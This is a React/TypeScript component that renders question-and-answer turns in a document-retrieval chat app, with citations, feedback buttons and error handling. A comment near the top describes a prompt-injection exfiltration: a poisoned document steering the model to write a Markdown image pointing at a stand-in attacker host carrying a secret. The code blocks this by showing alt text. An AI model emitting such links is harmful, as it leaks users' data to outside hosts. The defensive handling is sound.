import { memo, useEffect, useMemo, useRef, useState } from 'react';
import type { ReactNode } from 'react';
import type { Components } from 'react-markdown';
import type {
  CitationResponse,
  DocumentTask,
  FeedbackKind,
  FeedbackRating,
  PassageNarrowing,
  SummaryCoverage,
  TimingsResponse,
} from '../api/types';
import type { SourceChange } from '../utils/citationFreshness';
import { copyText } from '../utils/clipboard';
import { formatTurnTime, withCitationFootnotes } from '../utils/exportChat';
import { citationNumberFromHref, linkCitations } from '../utils/citations';
import { usePreviewTrigger } from '../hooks/usePreviewTrigger';
import { pageLabel } from '../utils/pages';
import { useMarkdownRenderer } from './markdownLoader';
import StreamingSkeleton from './StreamingSkeleton';
import AnswerFlags from './chat/AnswerFlags';
import AnswerVersions from './chat/AnswerVersions';
import ReformatMenu, { type ReformatStyle } from './chat/ReformatMenu';
import AnswerSources from './chat/AnswerSources';
import QuestionTurn from './chat/QuestionTurn';
import { type AskAgain, askAgain } from './chat/askAgain';
import { quotesOf } from './chat/quotes';
import { STREAMING_STAGE_LABELS } from '../utils/stages';
import './ChatMessage.css';
import { formatCost } from '../utils/cost';

// Answers quote retrieved documents, and a poisoned document can steer the model into
// writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
// it rendered, no click needed. Show the alt text instead of loading anything.
//
// Headings move down to h3-h6: an answer's "# Summary" sat as a second <h1> under the
// conversation title's, and screen-reader heading navigation treated each answer's
// headings as top-level sections of the page.
const MARKDOWN_COMPONENTS: Components = {
  img: ({ alt }) => (alt ? <span className="chat-message__image-alt">[{alt}]</span> : null),
  a: ({ href, children }) => <ExternalLink href={href}>{children}</ExternalLink>,
  h1: ({ children }) => <h3>{children}</h3>,
  h2: ({ children }) => <h4>{children}</h4>,
  h3: ({ children }) => <h5>{children}</h5>,
  h4: ({ children }) => <h6>{children}</h6>,
  h5: ({ children }) => <h6>{children}</h6>,
  h6: ({ children }) => <h6>{children}</h6>,
  // Wide tables scroll inside the answer instead of widening the page on a phone.
  table: ({ children }) => (
    <div className="chat-message__table-scroll">
      <table>{children}</table>
    </div>
  ),
};

// A link followed in this tab used to unload the app mid-answer. `noreferrer` also
// keeps the DocRAG URL out of wherever a document's link points.
function ExternalLink({ href, children }: { href?: string; children?: ReactNode }) {
  return (
    <a href={href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  );
}
/** An inline [n] marker: previews its source on hover or focus, opens it on click. */
function InlineCitation({
  number,
  source,
  onOpen,
  onHoverStart,
  onHoverEnd,
}: {
  number: number;
  source: CitationResponse;
  onOpen: () => void;
  onHoverStart: () => void;
  onHoverEnd?: () => void;
}) {
  const trigger = usePreviewTrigger({ onOpen, onHoverStart, onHoverEnd });
  return (
    <button
      type="button"
      className="chat-message__cite"
      {...trigger}
      aria-label={`Source ${number}: ${source.filename}, ${pageLabel(source.page, source.page_end).replace('p.', 'page ')}`}
      data-testid="inline-citation"
    >
      {number}
    </button>
  );
}

// Error turns created before this page load are history, not news: announcing each one
// as an alert on every conversation switch or reload read out stale failures.
const SESSION_STARTED_AT = Date.now();
// Error turns already announced this session: the thread remounts per conversation, and
// switching back re-announced every error in it.
const announcedErrors = new Set<string>();

/** Whether an error turn mounting now should be announced (once, and only if new). */
function announceOnce(turn: ChatTurn): boolean {
  if (turn.role !== 'error' || turn.timestamp < SESSION_STARTED_AT) return false;
  if (announcedErrors.has(turn.id)) return false;
  announcedErrors.add(turn.id);
  return true;
}

export interface FeedbackPayload {
  turnId: string;
  rating: FeedbackRating;
  question: string;
  answerExcerpt: string;
  citedFilenames: string[];
  traceId: string | null;
  kind: FeedbackKind;
  /** A rating of one cited source (its number) rather than of the whole answer. */
  citationSourceNumber?: number;
}

export interface ChatTurn {
  id: string;
  role: 'user' | 'assistant' | 'error';
  content: string;
  // An answer the reader saved (☆), listed under "Saved" in the conversation list.
  saved?: boolean;
  sources: CitationResponse[];
  timestamp: number;
  timings: TimingsResponse | null;
  traceId: string | null;
  // The question that produced this turn — set on error turns only, so a failed
  // question's text isn't lost and can be resubmitted via the Retry button.
  question?: string;
  // The rating given to this answer, kept on the turn so it survives a reload.
  feedback?: FeedbackRating;
  // Stopped by the user partway: the content is a fragment, not the whole answer.
  stopped?: boolean;
  // Cut off by a failed connection partway: also a fragment (the error turn after it
  // carries the Retry).
  incomplete?: boolean;
  // Served from the server's answer cache rather than generated for this question.
  cached?: boolean;
  // The model that was asked (absent on answers saved before this was recorded).
  model?: string;
  // The server said the documents don't answer it (answer_status insufficient_context
  // or no_context): still an answer, shown with a "not found" flag.
  notFound?: boolean;
  // The answer cites none of its sources (answer_status uncited): worth checking.
  uncited?: boolean;
  // The provider stopped at the token limit, so the answer ends mid-way.
  truncated?: boolean;
  // A whole-document task (summary, comparison) rather than a question: on the user
  // turn that asked it, and on its error turn, so Retry and Regenerate repeat the task.
  task?: DocumentTask;
  // Where the question looked (picked passages, pages, a section): on the user turn and
  // its error turn, so Retry and Regenerate look there again.
  narrowing?: PassageNarrowing;
  // A summary that read only part of a long document (evenly spaced passages).
  coverage?: SummaryCoverage;
  // Questions the server suggests asking next (FOLLOWUPS_ENABLED).
  followups?: string[];
  // An answer to a question asked with the conversation as history (rated as a
  // "follow_up"; see FeedbackKind).
  followUp?: boolean;
  // Sources marked "not relevant" (their numbers), so each is rated once.
  irrelevantSources?: number[];
  // Best cross-encoder score among the candidates (0-1), for the weak-support badge.
  topRerankScore?: number;
  // No passage cleared the server's bar: answered from the closest ones, which the
  // model was told match only weakly.
  weakMatch?: boolean;
  // Tokens the provider reported for this answer.
  usage?: { prompt: number; completion: number; costUsd?: number };
  // A "not found" answer's passages: what the model read and found no answer in (text
  // left out; opened by chunk id).
  contextSources?: CitationResponse[];
  // The model cited nothing; its citations were added by matching its sentences to the
  // sources (the server's CITATION_RETRY_MODE).
  autoCited?: boolean;
  // Picked passages ("Ask about these") the answer went without: more than the
  // prompt had room for.
  passagesLeftOut?: number;
  // Asked within some documents or tags, not the whole corpus.
  scoped?: boolean;
  // Earlier answers to the same question, oldest first (Regenerate, Reformat keep them).
  versions?: AnswerVersion[];
}

/** An earlier answer kept on a regenerated one (utils/answerVersions). */
export interface AnswerVersion {
  content: string;
  sources: CitationResponse[];
  timestamp: number;
  model?: string;
}

interface ChatMessageProps {
  turn: ChatTurn;
  engineerMode: boolean;
  // Set only on the single turn actively streaming; undefined means "not this one".
  streamStage?: string;
  // The streaming turn's question was asked at this time (epoch ms): the wait shown.
  streamStartedAt?: number;
  // How long the local model should take to read the prompt, from the server.
  streamEtaMs?: number | null;
  currentModelLabel?: string;
  // `task`: the whole-document task the question was (a summary), repeated as one.
  onRetry?: AskAgain;
  // Regenerate skips the server's answer cache; onRetry is used when this is absent.
  onRegenerate?: AskAgain;
  // Edit a user turn and ask again (a fork — the original conversation is kept).
  onEditQuestion?: (turnId: string, question: string) => void;
  // The question a "Regenerate" click on this (assistant) turn should re-ask —
  // undefined on any turn that isn't a regenerate-able assistant answer. Computed by
  // ChatThread from array position; see precedingUserTurns there.
  regenerateQuestion?: string;
  // The task of that question, when it was a summary or comparison.
  regenerateTask?: DocumentTask;
  regenerateNarrowing?: PassageNarrowing;
  // Off (undefined/false) unless the server has AppSettings.feedback_enabled set —
  // sourced from PublicConfigResponse.feedback_enabled via App.tsx.
  feedbackEnabled?: boolean;
  // Presentational: ChatMessage reports what happened (rating + everything needed to
  // build the request) and leaves the actual POST /feedback call to the caller — see
  // FeedbackPayload above.
  onFeedback?: (payload: FeedbackPayload) => void;
  /** `highlights`: the cited passages to mark in the document (CitationResponse.spans). */
  onOpenSource?: (filename: string, chunkId: string, highlights?: string[]) => void;
  onCitationHover?: (citation: CitationResponse) => void;
  onCitationLeave?: () => void;
  // A question is in flight: Regenerate and Retry would be silently ignored by useChat.
  busy?: boolean;
  // Ask one of the turn's suggested follow-ups; set only on the latest answer.
  onAskFollowup?: (question: string) => void;
  // The last turn is this question with no answer after it (stopped before the first
  // frame, or a reload during retrieval): offer to ask it again.
  unanswered?: boolean;
  // An answer whose best passage scored under this reads as weakly supported (the
  // server's RERANK_MIN_SCORE plus a margin); undefined: no badge.
  weakSupportBelow?: number;
  // A "not found" answer's next steps: ask the question again over every document
  // (offered when it was asked within some), or look at the closest passages.
  onAskEverywhere?: (question: string) => void;
  onSearchPassages?: (question: string) => void;
  /** Says something on the thread's one status line (a message carries no live region). */
  onAnnounce?: (message: string) => void;
  /** Save or unsave this answer. */
  onToggleSaved?: (turnId: string, saved: boolean) => void;
  /** Whether a cited document was deleted or uploaded again after this answer. */
  sourceChangeOf?: (filename: string, answeredAtMs: number) => SourceChange | null;
  /** Copy a link back to this answer (it opens in this browser). */
  onCopyLink?: (turnId: string) => void;
  /** Ask this answer's question again in another shape or language (Reformat). */
  onReformat?: (
    question: string,
    narrowing: PassageNarrowing | undefined,
    style: ReformatStyle,
    replaces: string,
  ) => void;
  /** This turn's position among the conversation's answers (1-based), for its label. */
  answerNumber?: number;
}

/** What the reader should know about how an answer was grounded, in words: the flags
 *  above say it in one or two, as a tooltip a touch or keyboard user never sees. */
function groundingNotes(turn: ChatTurn): string[] {
  const notes: string[] = [];
  if (turn.notFound) {
    notes.push(
      turn.scoped
        ? 'Nothing in the selected documents answers this.'
        : 'Nothing in your documents answers this.',
    );
  } else if (turn.weakMatch) {
    notes.push(
      'No passage matched this question closely; the answer comes from the nearest ones — check it against its sources.',
    );
  }
  if (turn.uncited) notes.push('This answer cites none of its sources — check it against your documents.');
  if (turn.autoCited) {
    notes.push(
      "The model didn't cite its sources; the citations were added by matching its sentences to the passages.",
    );
  }
  if (turn.truncated) notes.push('The model reached its output limit and stopped mid-answer.');
  if (turn.passagesLeftOut) {
    const count = turn.passagesLeftOut;
    notes.push(
      `${count} of the passages you picked ${count === 1 ? "wasn't" : "weren't"} read: ` +
        'more than one answer has room for. Ask about fewer at a time.',
    );
  }
  return notes;
}

export type { AskAgain } from './chat/askAgain';

function formatDuration(totalMs: number): string {
  return `${(totalMs / 1000).toFixed(2)}s`;
}


function ChatMessage({
  turn,
  engineerMode,
  streamStage,
  currentModelLabel,
  onRetry,
  onRegenerate,
  onEditQuestion,
  regenerateQuestion,
  regenerateTask,
  regenerateNarrowing,
  feedbackEnabled,
  onFeedback,
  onOpenSource,
  onCitationHover,
  onCitationLeave,
  busy = false,
  onAskFollowup,
  unanswered = false,
  weakSupportBelow,
  streamStartedAt,
  streamEtaMs,
  onAskEverywhere,
  onSearchPassages,
  onAnnounce,
  onToggleSaved,
  sourceChangeOf,
  answerNumber,
  onCopyLink,
  onReformat,
}: ChatMessageProps) {
  const [copied, setCopied] = useState(false);
  const [copyFailed, setCopyFailed] = useState(false);
  // Sticky once set: a rating is a one-shot action, not a toggle — clicking again
  // would just resubmit the same signal, so the buttons disable after the first pick.
  // Seeded from the turn so a remount (reload, conversation switch) can't re-enable them.
  const [feedbackGiven, setFeedbackGiven] = useState<FeedbackRating | null>(turn.feedback ?? null);
  // Follows the turn when a rating that failed to send is taken back.
  useEffect(() => setFeedbackGiven(turn.feedback ?? null), [turn.feedback]);
  const copyTimerRef = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);
  useEffect(() => () => clearTimeout(copyTimerRef.current), []);

  const submitFeedback = (rating: FeedbackRating) => {
    if (!regenerateQuestion || !onFeedback) return;
    setFeedbackGiven(rating);
    onFeedback({
      turnId: turn.id,
      rating,
      question: regenerateQuestion,
      answerExcerpt: turn.content,
      citedFilenames: [...new Set(turn.sources.map((source) => source.filename))],
      traceId: turn.traceId,
      // A summary's question is a label for the task; it was asked without history.
      kind: regenerateTask ? 'summary' : turn.followUp ? 'follow_up' : 'question',
    });
  };

  const markNotRelevant = (source: CitationResponse) => {
    if (!regenerateQuestion || !onFeedback) return;
    onFeedback({
      turnId: turn.id,
      rating: 'down',
      question: regenerateQuestion,
      answerExcerpt: turn.content,
      citedFilenames: [source.filename],
      traceId: turn.traceId,
      kind: regenerateTask ? 'summary' : turn.followUp ? 'follow_up' : 'question',
      citationSourceNumber: source.source_number,
    });
  };

  const settle = (ok: boolean) => {
    clearTimeout(copyTimerRef.current);
    // The label change alone wasn't announced: it is the only sign the copy worked.
    onAnnounce?.(ok ? 'Answer copied.' : 'Copy failed.');
    if (ok) {
      setCopied(true);
      copyTimerRef.current = setTimeout(() => setCopied(false), 1500);
    } else {
      setCopyFailed(true);
      copyTimerRef.current = setTimeout(() => setCopyFailed(false), 1500);
    }
  };

  const [alerting] = useState(() => announceOnce(turn));
  const handleCopy = () => {
    // The answer's [n] markers would dangle without their sources, so the copy carries
    // them as footnotes — the same lines the Markdown export writes.
    void copyText(withCitationFootnotes(turn.content, turn.sources)).then(settle);
  };

  const showSkeleton = streamStage !== undefined && turn.content === '';
  const Markdown = useMarkdownRenderer();
  // [n] markers become buttons that open (and on hover preview) the source they cite.
  const markdownComponents = useMemo<Components>(() => {
    const byNumber = new Map(turn.sources.map((source) => [source.source_number, source]));
    return {
      ...MARKDOWN_COMPONENTS,
      a: ({ href, children }) => {
        const number = citationNumberFromHref(href);
        if (number === null) return <ExternalLink href={href}>{children}</ExternalLink>;
        const source = byNumber.get(number);
        if (!source) return <>[{number}]</>;
        return (
          <InlineCitation
            number={number}
            source={source}
            onOpen={() => onOpenSource?.(source.filename, source.chunk_id, quotesOf(source))}
            onHoverStart={() => onCitationHover?.(source)}
            onHoverEnd={onCitationLeave}
          />
        );
      },
    };
  }, [turn.sources, onOpenSource, onCitationHover, onCitationLeave]);
  const linkedContent = useMemo(() => {
    const highest = turn.sources.reduce((max, source) => Math.max(max, source.source_number), 0);
    return linkCitations(turn.content, highest);
  }, [turn.content, turn.sources]);
  const timings = turn.timings;
  const showMeta = engineerMode && turn.role === 'assistant' && !showSkeleton && timings !== null;

  return (
    <div
      className="chat-message"
      data-testid="chat-message"
      data-role={turn.role}
      data-turn-id={turn.id}
      // Jump points for screen readers (and j/k): each question and answer is one.
      role="article"
      tabIndex={-1}
      aria-label={
        turn.role === 'user'
          ? 'Question'
          : turn.role === 'assistant'
            ? `Answer${answerNumber ? ` ${answerNumber}` : ''}${turn.saved ? ', saved' : ''}`
            : 'Error'
      }
    >
      {turn.role === 'user' && (
        <QuestionTurn turn={turn} busy={busy} unanswered={unanswered} onRetry={onRetry} onEditQuestion={onEditQuestion} />
      )}

      {turn.role === 'assistant' && (
        <div className="chat-message__row">
          <span className="chat-message__gutter chat-message__gutter--answer" aria-hidden="true">
            A
          </span>
          <div className="chat-message__answer" dir="auto">
            {showSkeleton ? (
              <StreamingSkeleton stage={streamStage} startedAt={streamStartedAt} etaMs={streamEtaMs} />
            ) : (
              <div className="chat-message__markdown">
                {Markdown ? (
                  <Markdown
                    text={linkedContent}
                    components={markdownComponents}
                    streaming={streamStage !== undefined}
                  />
                ) : (
                  // The raw answer, not linkedContent: its citation links would show as
                  // "[1](#docrag-cite-1)" until the renderer arrives.
                  <p className="chat-message__plain">{turn.content}</p>
                )}
              </div>
            )}
            {/* A stage after the text has started (checking citations): a whole extra
                generation on a local model, with the answer otherwise sitting still. */}
            {streamStage !== undefined && !showSkeleton && !STREAMING_STAGE_LABELS.has(streamStage) && (
              <div className="chat-message__stage" data-testid="chat-message-stage">
                <span className="chat-message__stage-spinner" aria-hidden="true" />
                {streamStage}
              </div>
            )}
            <div className="chat-message__meta-row">
              <AnswerFlags turn={turn} weakSupportBelow={weakSupportBelow} />
              <time
                className="chat-message__timestamp mono"
                dateTime={new Date(turn.timestamp).toISOString()}
              >
                {formatTurnTime(turn.timestamp)}
              </time>
              {turn.content && (
                <button
                  type="button"
                  className="chat-message__copy"
                  onClick={handleCopy}
                  data-testid="chat-message-copy"
                >
                  {copied ? 'Copied' : copyFailed ? 'Copy failed' : 'Copy'}
                </button>
              )}
              {turn.content && onCopyLink && !streamStage && (
                <button
                  type="button"
                  className="chat-message__copy"
                  onClick={() => onCopyLink(turn.id)}
                  title="A link back to this answer (opens in this browser)"
                  data-testid="chat-message-link"
                >
                  Link
                </button>
              )}
              {turn.content && onToggleSaved && !streamStage && !turn.incomplete && (
                <button
                  type="button"
                  className="chat-message__copy"
                  aria-pressed={turn.saved ? 'true' : 'false'}
                  onClick={() => {
                    onToggleSaved(turn.id, !turn.saved);
                    onAnnounce?.(turn.saved ? 'Answer unsaved.' : 'Answer saved.');
                  }}
                  title={turn.saved ? 'Saved — listed under Saved in the conversations' : 'Save this answer'}
                  data-testid="chat-message-save"
                >
                  {turn.saved ? '★ Saved' : '☆ Save'}
                </button>
              )}
              {turn.content && regenerateQuestion && onRetry && !streamStage && !turn.incomplete && (
                <button
                  type="button"
                  className="chat-message__regenerate"
                  aria-disabled={busy || undefined}
                  onClick={() =>
                    !busy &&
                    askAgain(
                      onRegenerate ?? onRetry,
                      regenerateQuestion,
                      regenerateTask,
                      regenerateNarrowing,
                      onRegenerate ? turn.id : undefined,
                    )
                  }
                  data-testid="chat-message-regenerate"
                >
                  Regenerate
                </button>
              )}
              {turn.content &&
                regenerateQuestion &&
                onReformat &&
                !regenerateTask &&
                !streamStage &&
                !turn.incomplete && (
                  <ReformatMenu
                    disabled={busy}
                    onReformat={(style) =>
                      onReformat(regenerateQuestion, regenerateNarrowing, style, turn.id)
                    }
                  />
                )}
              {turn.content &&
                feedbackEnabled &&
                regenerateQuestion &&
                onFeedback &&
                !streamStage &&
                !turn.incomplete && (
                <div className="chat-message__feedback" role="group" aria-label="Rate this answer">
                  <button
                    type="button"
                    className="chat-message__feedback-btn"
                    aria-pressed={feedbackGiven === 'up'}
                    aria-label="Helpful"
                    title="Helpful"
                    aria-disabled={feedbackGiven !== null || undefined}
                    onClick={() => feedbackGiven === null && submitFeedback('up')}
                    data-testid="chat-message-feedback-up"
                  >
                    <span aria-hidden="true">{feedbackGiven === 'up' ? '▲' : '△'}</span>
                  </button>
                  <button
                    type="button"
                    className="chat-message__feedback-btn"
                    aria-pressed={feedbackGiven === 'down'}
                    aria-label="Not helpful"
                    title="Not helpful"
                    aria-disabled={feedbackGiven !== null || undefined}
                    onClick={() => feedbackGiven === null && submitFeedback('down')}
                    data-testid="chat-message-feedback-down"
                  >
                    <span aria-hidden="true">{feedbackGiven === 'down' ? '▼' : '▽'}</span>
                  </button>
                </div>
              )}
            </div>
            {!streamStage && groundingNotes(turn).length > 0 && (
              <div className="chat-message__notes" data-testid="chat-message-notes">
                <p>{groundingNotes(turn).join(' ')}</p>
                {turn.notFound && regenerateQuestion && !regenerateTask && (
                  <div className="chat-message__note-actions">
                    {turn.scoped && onAskEverywhere && (
                      <button
                        type="button"
                        className="chat-message__action"
                        aria-disabled={busy || undefined}
                        onClick={() => !busy && onAskEverywhere(regenerateQuestion)}
                        data-testid="chat-message-ask-everywhere"
                      >
                        Ask across all documents
                      </button>
                    )}
                    {onSearchPassages && (
                      <button
                        type="button"
                        className="chat-message__action"
                        onClick={() => onSearchPassages(regenerateQuestion)}
                        data-testid="chat-message-search-passages"
                      >
                        Search the passages
                      </button>
                    )}
                  </div>
                )}
              </div>
            )}
            {turn.versions && turn.versions.length > 0 && !streamStage && (
              <AnswerVersions
                versions={turn.versions}
                components={MARKDOWN_COMPONENTS}
                onOpenSource={onOpenSource ? (filename, chunkId) => onOpenSource(filename, chunkId) : undefined}
              />
            )}
            <AnswerSources
              turn={turn}
              busy={busy}
              onOpenSource={onOpenSource}
              onCitationHover={onCitationHover}
              onCitationLeave={onCitationLeave}
              sourceChangeOf={sourceChangeOf}
              onNotRelevant={
                feedbackEnabled && onFeedback && regenerateQuestion && !streamStage
                  ? markNotRelevant
                  : undefined
              }
              onAskWithout={
                regenerateQuestion && onRetry && !regenerateTask && !streamStage && !turn.incomplete
                  ? (source) =>
                      askAgain(onRegenerate ?? onRetry, regenerateQuestion, undefined, {
                        ...regenerateNarrowing,
                        exclude_chunk_ids: [
                          ...(regenerateNarrowing?.exclude_chunk_ids ?? []),
                          source.chunk_id,
                        ].slice(-100),
                      })
                  : undefined
              }
            />
            {turn.followups && onAskFollowup && !streamStage && (
              <div className="chat-message__followups" role="group" aria-label="Suggested follow-up questions">
                {turn.followups.map((question) => (
                  <button
                    key={question}
                    type="button"
                    className="chat-message__followup"
                    aria-disabled={busy || undefined}
                    onClick={() => !busy && onAskFollowup(question)}
                    data-testid="chat-message-followup"
                  >
                    {question}
                  </button>
                ))}
              </div>
            )}
            {showMeta && timings && (
              <div className="chat-message__engineer-meta mono">
                <span>{formatDuration(timings.total_ms)}</span>
                {(turn.model ?? currentModelLabel) && <span>{turn.model ?? currentModelLabel}</span>}
                {turn.usage && (
                  <span data-testid="chat-message-usage">
                    {turn.usage.prompt + turn.usage.completion} tokens
                    {turn.usage.costUsd !== undefined ? ` · ${formatCost(turn.usage.costUsd)}` : ''}
                  </span>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {turn.role === 'error' && (
        <div className="chat-message__row">
          <span className="chat-message__gutter chat-message__gutter--error" aria-hidden="true">
            !
          </span>
          <div
            className="chat-message__error"
            role={alerting ? 'alert' : undefined}
          >
            {turn.content}
            {turn.question && onRetry && (
              <button
                type="button"
                className="chat-message__retry"
                aria-disabled={busy || undefined}
                onClick={() => !busy && askAgain(onRetry, turn.question!, turn.task, turn.narrowing)}
                data-testid="chat-message-retry"
              >
                Retry
              </button>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

// Default shallow-compare memo is sufficient: `turn` keeps referential identity for
// every turn except the one an update actually targets (see useChat's
// updateAssistantTurn), and the callback props are stabilized at their App.tsx source
// (askQuestion, onOpenSource, onCitationLeave) or are native useState setters
// (onCitationHover). Without this, every prior answer's ReactMarkdown re-parses on
// every SSE delta of the currently streaming turn — cost scales with conversation
// length instead of staying O(1).
export default memo(ChatMessage);
